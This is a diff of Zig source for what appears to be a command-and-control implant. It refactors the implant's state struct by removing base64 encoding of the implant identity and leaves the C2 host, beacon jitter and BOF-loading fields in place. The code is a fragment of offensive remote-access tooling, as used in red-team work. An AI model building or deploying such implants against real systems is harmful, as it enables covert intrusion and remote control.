@@ -71,9 +71,6 @@ pub const State = struct {
     pending_bofs: std.array_list.Managed(PendingBof),
     persistent_bofs: std.AutoHashMap(u64, bof.Object),
 
-    base64_decoder: std.base64.Base64Decoder,
-    base64_encoder: std.base64.Base64Encoder,
-
     fn getImplantIdentity(allocator: std.mem.Allocator) ![]u8 {
         const arch_name = @tagName(@import("builtin").cpu.arch);
         const os_release = @tagName(@import("builtin").os.tag);
@@ -89,8 +86,6 @@ pub const State = struct {
     }
 
     pub fn init(allocator: std.mem.Allocator, implantActions: ImplantActions) !State {
-        const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
-        const base64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');
 
         const implant_identity = try getImplantIdentity(allocator);
 
@@ -105,15 +100,11 @@ pub const State = struct {
 
         const net_client = implant_actions.netInit(@constCast(@ptrCast(&allocator)));
 
-        //TODO: move it to ImplanActions.netMasquarede(...) function
-        const implant_identity_b64 = try allocator.alloc(u8, base64_encoder.calcSize(implant_identity.len));
-        _ = std.base64.Base64Encoder.encode(&base64_encoder, implant_identity_b64, implant_identity);
-
         return State{
             .allocator = allocator,
             .net_client = net_client,
 
-            .implant_identity = implant_identity_b64,
+            .implant_identity = implant_identity,
             .implant_actions = implant_actions,
 
             .jitter = 3,
@@ -121,9 +112,6 @@ pub const State = struct {
             .c2_host = "127.0.0.1:8000",
             .c2_endpoint = "/endpoint",
             .assets_host = "127.0.0.1:8000",
-
-            .base64_decoder = base64_decoder,
-            .base64_encoder = base64_encoder,
 
             .pending_bofs = std.array_list.Managed(PendingBof).init(allocator),
             .persistent_bofs = std.AutoHashMap(u64, bof.Object).init(allocator),
